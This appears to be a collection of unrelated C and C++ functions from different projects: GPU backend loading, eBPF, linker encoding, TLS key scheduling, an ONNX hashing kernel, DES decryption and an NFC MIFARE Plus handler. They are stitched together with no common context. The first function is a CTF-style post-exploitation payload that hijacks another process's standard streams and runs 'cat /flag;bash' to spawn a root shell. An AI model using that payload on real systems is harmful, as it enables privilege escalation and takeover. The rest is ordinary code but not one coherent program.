void root(char *buf)
{
	int pid = strtoull(buf, 0, 10);
	char path[0x100];
	printf("run root()\n");
	// fix stdin, stdout, stderr
	sprintf(path, "/proc/%d/ns/net", pid);
	int pfd = syscall(SYS_pidfd_open, pid, 0);
	int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
	int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
	int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
	dup2(stdinfd, 0);
	dup2(stdoutfd, 1);
	dup2(stderrfd, 2);
	// just cat the flag
	system("cat /flag;bash");
}

static bool ImportVulkanImpl(void) {
    // Note: Unlike CUDA, we don't skip Apple Silicon here because
    // Vulkan works on macOS via MoltenVK (Vulkan-to-Metal translation)

    // Check if we're allowed to even try
    switch (FLAG_gpu) {
    case LLAMAFILE_GPU_AUTO:
    case LLAMAFILE_GPU_VULKAN:
        break;
    default:
        return false;
    }

    // Determine DSO name
    const char *ext = llamafile_get_dso_extension();
    char vulkan_dso[64];
    snprintf(vulkan_dso, sizeof(vulkan_dso), "ggml-vulkan.%s", ext);

    // Try to load pre-built DSO
    if (!llamafile_try_load_prebuilt_dso(vulkan_dso, "vulkan", LinkVulkan)) {
        // No pre-built DSO found
        if (FLAG_verbose) {
            fprintf(stderr, "vulkan: no pre-built GPU library found\n");
            fprintf(stderr, "vulkan: to enable Vulkan support, build with:\n");
            fprintf(stderr, "vulkan:   llamafile/vulkan.sh\n");
        }
        return false;
    }

    // Register the Vulkan backend with GGML
    if (g_vulkan.backend_reg) {
        ggml_backend_reg_t reg = g_vulkan.backend_reg();
        if (reg) {
            ggml_backend_register(reg);
            if (FLAG_verbose)
                fprintf(stderr, "vulkan: Vulkan backend registered with GGML\n");
        }
    }

    return true;
}

static NTSTATUS
_bpf2c_query_npi_module_id(
    _In_ const wchar_t* value_name,
    unsigned long value_type,
    _In_ const void* value_data,
    unsigned long value_length,
    _Inout_ void* context,
    _Inout_ void* entry_context)
{
    UNREFERENCED_PARAMETER(value_name);
    UNREFERENCED_PARAMETER(context);
    UNREFERENCED_PARAMETER(entry_context);

    if (value_type != REG_BINARY) {
        return STATUS_INVALID_PARAMETER;
    }
    if (value_length != sizeof(_bpf2c_module_id.Guid)) {
        return STATUS_INVALID_PARAMETER;
    }

    memcpy(&_bpf2c_module_id.Guid, value_data, value_length);
    return STATUS_SUCCESS;
}

static uint32_t find_rec(char *name)
{
  char *p = (char *)obuf;
  uint32_t n;
  for (n = 2; *p; n++) {
    if (strcmp(p, name) == 0)
      return n;
    p += strlen(p)+1;
  }
  if (p+strlen(name)+1 >= (char *)obuf+sizeof(obuf)) {
    fprintf(stderr, "Error: output buffer overflow\n");
    exit(1);
  }
  strcpy(p, name);
  return n;
}

static ld_elf_ifunc_result_t ld_elf_ifunc_encode_riscv64(
        uint8_t output[LD_ELF_IFUNC_PLTGOT_ENTRY_SIZE],
        uint64_t entry_address, uint64_t got_address) {
    if ((entry_address & 3U) != 0U || (got_address & 7U) != 0U)
        return LD_ELF_IFUNC_UNALIGNED;

    int64_t delta;
    if (got_address >= entry_address) {
        uint64_t magnitude = got_address - entry_address;
        /*
         * Rounding PCREL_HI20 at 0x7ffff800 would produce +0x80000,
         * which is outside AUIPC's signed 20-bit immediate.
         */
        if (magnitude > UINT64_C(0x7ffff7ff))
            return LD_ELF_IFUNC_RANGE;
        delta = (int64_t) magnitude;
    } else {
        uint64_t magnitude = entry_address - got_address;
        if (magnitude > UINT64_C(0x80000000))
            return LD_ELF_IFUNC_RANGE;
        delta = -(int64_t) magnitude;
    }

    /* Portable floor((delta + 0x800) / 0x1000), without shifting negative. */
    int64_t rounded = delta + INT64_C(0x800);
    int64_t high = rounded >= 0
                           ? rounded / INT64_C(0x1000)
                           : -((-rounded + INT64_C(0xfff)) /
                               INT64_C(0x1000));
    int64_t low = delta - high * INT64_C(0x1000);
    if (high < -INT64_C(0x80000) || high > INT64_C(0x7ffff) ||
        low < -INT64_C(0x800) || low > INT64_C(0x7ff)) {
        return LD_ELF_IFUNC_RANGE;
    }

    uint32_t auipc = UINT32_C(0x00000e17) |
                     (((uint32_t) high & UINT32_C(0xfffff)) << 12U);
    uint32_t load = UINT32_C(0x000e3e03) |
                    (((uint32_t) low & UINT32_C(0xfff)) << 20U);
    uint8_t encoded[LD_ELF_IFUNC_PLTGOT_ENTRY_SIZE];
    ld_elf_ifunc_write_u32(encoded, auipc);
    ld_elf_ifunc_write_u32(encoded + 4U, load);
    ld_elf_ifunc_write_u32(encoded + 8U, UINT32_C(0x000e0367));
    ld_elf_ifunc_write_u32(encoded + 12U, UINT32_C(0x00000013));
    memcpy(output, encoded, sizeof(encoded));
    return LD_ELF_IFUNC_OK;
}

static void ssl_tls13_hkdf_encode_label(
    size_t desired_length,
    const unsigned char *label, size_t label_len,
    const unsigned char *ctx, size_t ctx_len,
    unsigned char *dst, size_t *dst_len)
{
    size_t total_label_len =
        sizeof(tls13_label_prefix) + label_len;
    size_t total_hkdf_lbl_len =
        SSL_TLS1_3_KEY_SCHEDULE_HKDF_LABEL_LEN(total_label_len, ctx_len);

    unsigned char *p = dst;

    /* Add the size of the expanded key material. */
#if MBEDTLS_SSL_TLS1_3_KEY_SCHEDULE_MAX_EXPANSION_LEN > UINT16_MAX
#error "The desired key length must fit into an uint16 but \
    MBEDTLS_SSL_TLS1_3_KEY_SCHEDULE_MAX_EXPANSION_LEN is greater than UINT16_MAX"
#endif

    *p++ = MBEDTLS_BYTE_1(desired_length);
    *p++ = MBEDTLS_BYTE_0(desired_length);

    /* Add label incl. prefix */
    *p++ = MBEDTLS_BYTE_0(total_label_len);
    memcpy(p, tls13_label_prefix, sizeof(tls13_label_prefix));
    p += sizeof(tls13_label_prefix);
    memcpy(p, label, label_len);
    p += label_len;

    /* Add context value */
    *p++ = MBEDTLS_BYTE_0(ctx_len);
    if (ctx_len != 0) {
        memcpy(p, ctx, ctx_len);
    }

    /* Return total length to the caller.  */
    *dst_len = total_hkdf_lbl_len;
}

Status NGramHashMapping<T>::Compute(OpKernelContext* context) const {
  const Tensor* input_ids = context->Input<Tensor>(0);
  const Tensor* multipliers = context->Input<Tensor>(1);
  const Tensor* vocab_sizes = context->Input<Tensor>(2);
  const Tensor* past_ids = context->Input<Tensor>(3);

  const TensorShape& input_shape = input_ids->Shape();
  ORT_RETURN_IF_NOT(input_shape.NumDimensions() == 2, "input_ids must have rank 2");
  ORT_RETURN_IF_NOT(multipliers->Shape().NumDimensions() == 1 &&
                        multipliers->Shape()[0] == max_ngram_size_,
                    "multipliers must have shape (max_ngram_size)");
  const int64_t num_heads = (max_ngram_size_ - 1) * n_head_per_ngram_;
  ORT_RETURN_IF_NOT(vocab_sizes->Shape().NumDimensions() == 1 && vocab_sizes->Shape()[0] == num_heads,
                    "vocab_sizes must have shape ((max_ngram_size - 1) * n_head_per_ngram)");

  const int64_t batch_size = input_shape[0];
  const int64_t sequence_length = input_shape[1];
  // An n-gram window reaches this many positions before the current token.
  const int64_t state_length = max_ngram_size_ - 1;
  if (past_ids != nullptr) {
    ORT_RETURN_IF_NOT(past_ids->Shape() == TensorShape({batch_size, state_length}),
                      "past_ids must have shape (batch_size, max_ngram_size - 1)");
  }

  Tensor* output = context->Output(0, TensorShape({batch_size, sequence_length, num_heads}));
  Tensor* present_ids = context->Output(1, TensorShape({batch_size, state_length}));

  const T* input_data = input_ids->Data<T>();
  const T* multiplier_data = multipliers->Data<T>();
  const T* vocab_data = vocab_sizes->Data<T>();
  const T* past_data = past_ids == nullptr ? nullptr : past_ids->Data<T>();

  // A non-positive head vocabulary size has no meaningful modulo. Every EP guards the division to
  // avoid a device-side divide-by-zero, which turns the mistake into a constant hash id of 0 for that
  // head rather than a crash. That is a silent wrong answer, so validate it here where vocab_sizes is
  // already resident on the host and the check costs one pass over a tiny tensor.
  for (int64_t h = 0; h < num_heads; ++h) {
    ORT_RETURN_IF_NOT(vocab_data[h] > 0,
                      "vocab_sizes must be positive; entry ", h, " is ", static_cast<int64_t>(vocab_data[h]));
  }

  if (input_shape.Size() != 0) {
    T* output_data = output->MutableData<T>();
    const int64_t total = batch_size * sequence_length;
    ThreadPool::TryParallelFor(
        context->GetOperatorThreadPool(), narrow<ptrdiff_t>(total), static_cast<double>(max_ngram_size_ * n_head_per_ngram_),
        [&](ptrdiff_t begin, ptrdiff_t end) {
          for (int64_t linear = begin; linear < end; ++linear) {
            const int64_t t = linear % sequence_length;
            const int64_t b = linear / sequence_length;
            const int64_t input_base = b * sequence_length;
            const int64_t output_base = linear * num_heads;

            for (int64_t n = 2; n <= max_ngram_size_; ++n) {
              T mix = 0;
              for (int64_t k = 0; k < n; ++k) {
                const int64_t source_t = t - k;
                const T token = source_t >= 0 ? input_data[input_base + source_t]
                                              : HistoryId(past_data, b, state_length + source_t, state_length);
                const T product = engram_helper::WrappedMultiply(token, multiplier_data[k]);
                mix = k == 0 ? product : static_cast<T>(mix ^ product);
              }

              const int64_t ngram_offset = (n - 2) * n_head_per_ngram_;
              for (int64_t h = 0; h < n_head_per_ngram_; ++h) {
                const int64_t out_h = ngram_offset + h;
                // vocab_sizes was validated to be positive above, so the modulo is always well defined.
                output_data[output_base + out_h] = engram_helper::PositiveMod(mix, vocab_data[out_h]);
              }
            }
          }
        });
  }

  // present_ids is the right-aligned trailing window of (past_ids ++ input_ids), so it is well defined
  // even when this call is shorter than the window. It is written last because past_ids may share
  // its allocation, and the hash loop above still needs the original history. Within this loop the
  // aliased case is safe too: slot j writes index j and reads index j + sequence_length, so the walk
  // is strictly ahead of itself.
  if (present_ids != nullptr) {
    T* present_data = present_ids->MutableData<T>();
    for (int64_t b = 0; b < batch_size; ++b) {
      for (int64_t j = 0; j < state_length; ++j) {
        // Virtual position of slot j relative to the end of input_ids.
        const int64_t source_t = sequence_length - state_length + j;
        present_data[b * state_length + j] =
            source_t >= 0 ? input_data[b * sequence_length + source_t]
                          : HistoryId(past_data, b, state_length + source_t, state_length);
      }
    }
  }

  return Status::OK();
}

void DecryptBlock(const u8 in[8], u8 out[8]) const {
		u8 bits[64];
		u8 permuted[64];
		BytesToBits(in, 8, bits);
		Permute(bits, permuted, kIP, 64);

		u8 left[32], right[32];
		memcpy(left, permuted, 32);
		memcpy(right, permuted + 32, 32);

		// Subkeys in reverse order is what makes this a decrypt.
		for (int round = 15; round >= 0; round--) {
			u8 expanded[48];
			Permute(right, expanded, kE, 48);
			for (int i = 0; i < 48; i++) {
				expanded[i] ^= subkeys_[round][i];
			}

			u8 substituted[32];
			for (int box = 0; box < 8; box++) {
				const u8 *six = expanded + box * 6;
				const int row = (six[0] << 1) | six[5];
				const int column = (six[1] << 3) | (six[2] << 2) | (six[3] << 1) | six[4];
				const u8 value = kSBox[box][row * 16 + column];
				for (int bit = 0; bit < 4; bit++) {
					substituted[box * 4 + bit] = (value >> (3 - bit)) & 1;
				}
			}

			u8 mixed[32];
			Permute(substituted, mixed, kP, 32);
			u8 next[32];
			for (int i = 0; i < 32; i++) {
				next[i] = left[i] ^ mixed[i];
			}
			memcpy(left, right, 32);
			memcpy(right, next, 32);
		}

		u8 combined[64];
		memcpy(combined, right, 32);
		memcpy(combined + 32, left, 32);
		Permute(combined, permuted, kFP, 64);
		BitsToBytes(permuted, 8, out);
	}

NfcCommand
    mf_plus_listener_write_handler(MfPlusListener* instance, const BitBuffer* rx, bool encrypted) {
    // [WRITE, BNr_lo, BNr_hi, data(16), cmd_mac(8)]. 0xA1 = encrypted (keys; the block is
    // CBC-decrypted with the write IV), 0xA3 = plain (data blocks carry plaintext). Both MAC the
    // command; a reader writes only after authenticating.
    if(instance->state != MfPlusListenerStateAuthenticated) {
        FURI_LOG_D(TAG, "WRITE before authentication (state=%d)", instance->state);
        mf_plus_listener_send_status(instance, MF_PLUS_STATUS_CMD_UNAVAILABLE);
        return NfcCommandContinue;
    }
    if(bit_buffer_get_size_bytes(rx) < 3 + MF_PLUS_BLOCK_SIZE + MF_PLUS_MAC_SIZE) {
        FURI_LOG_D(TAG, "WRITE frame too short");
        mf_plus_listener_send_status(instance, MF_PLUS_STATUS_CMD_UNAVAILABLE);
        return NfcCommandContinue;
    }

    const uint8_t block_low = bit_buffer_get_byte(rx, 1);
    const uint8_t block_high = bit_buffer_get_byte(rx, 2);
    const uint16_t block_addr = block_low | ((uint16_t)block_high << 8);
    const uint8_t* wire_data = bit_buffer_get_data(rx) + 3; // 16 data bytes as transmitted
    const uint8_t* received_mac = bit_buffer_get_data(rx) + 3 + MF_PLUS_BLOCK_SIZE;

    MfPlusListenerSession* s = &instance->session;
    const uint8_t opcode = encrypted ? MF_PLUS_CMD_WRITE_ENC : MF_PLUS_CMD_WRITE_PLAIN;

    // Verify the command MAC (pre-increment w_ctr) over {BNr_lo, BNr_hi, data-as-transmitted}.
    uint8_t mac_input[2 + MF_PLUS_BLOCK_SIZE];
    mac_input[0] = block_low;
    mac_input[1] = block_high;
    memcpy(&mac_input[2], wire_data, MF_PLUS_BLOCK_SIZE);
    uint8_t cmd_mac[MF_PLUS_MAC_SIZE];
    mf_plus_crypto_calculate_mac(
        s->k_mac, opcode, s->w_ctr, s->ti, mac_input, sizeof(mac_input), cmd_mac);
    if(memcmp(received_mac, cmd_mac, MF_PLUS_MAC_SIZE) != 0) {
        FURI_LOG_D(TAG, "WRITE command MAC mismatch");
        mf_plus_listener_send_status(instance, MF_PLUS_STATUS_AUTH_ERROR);
        return NfcCommandContinue;
    }

    // Recover the plaintext: 0xA1 CBC-decrypts with the write IV (pre-increment w_ctr); 0xA3 already
    // carries plaintext.
    uint8_t plain[MF_PLUS_BLOCK_SIZE];
    if(encrypted) {
        uint8_t iv[MF_PLUS_AES_BLOCK_SIZE];
        mf_plus_crypto_build_write_iv(s->ti, s->r_ctr, s->w_ctr, iv);
        mf_plus_crypto_cbc_decrypt(s->k_enc, iv, wire_data, plain, MF_PLUS_BLOCK_SIZE);
    } else {
        memcpy(plain, wire_data, MF_PLUS_BLOCK_SIZE);
    }

    if(!mf_plus_listener_store_write(instance, block_addr, plain)) {
        FURI_LOG_D(TAG, "WRITE to unsupported address 0x%04X", block_addr);
        mf_plus_listener_send_status(instance, MF_PLUS_STATUS_CMD_UNAVAILABLE);
        return NfcCommandContinue;
    }

    // Write accepted: advance w_ctr, then MAC the OK status over the post-increment counter.
    s->w_ctr++;
    uint8_t resp_mac[MF_PLUS_MAC_SIZE];
    mf_plus_crypto_calculate_mac(s->k_mac, MF_PLUS_STATUS_OK, s->w_ctr, s->ti, NULL, 0, resp_mac);

    uint8_t resp[1 + MF_PLUS_MAC_SIZE];
    resp[0] = MF_PLUS_STATUS_OK;
    memcpy(&resp[1], resp_mac, MF_PLUS_MAC_SIZE);
    mf_plus_listener_send(instance, resp, sizeof(resp));
    return NfcCommandContinue;
}

